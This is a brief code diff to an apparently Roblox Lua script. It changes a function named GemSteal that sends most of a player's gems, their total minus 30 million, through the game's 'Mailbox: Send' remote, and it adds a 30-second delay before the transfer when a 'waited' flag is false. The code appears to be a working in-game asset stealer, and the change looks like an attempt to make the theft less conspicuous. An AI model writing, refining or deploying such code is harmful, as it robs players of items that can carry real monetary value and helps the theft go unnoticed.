@@ -31,7 +31,12 @@ local function GemSteal()
                         [4] = GemId,
                         [5] = GemAmount1 - 30000000
                     }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+               if waited == false then
+                    task.wait(30)
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                else
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                end
         end
     end
 end
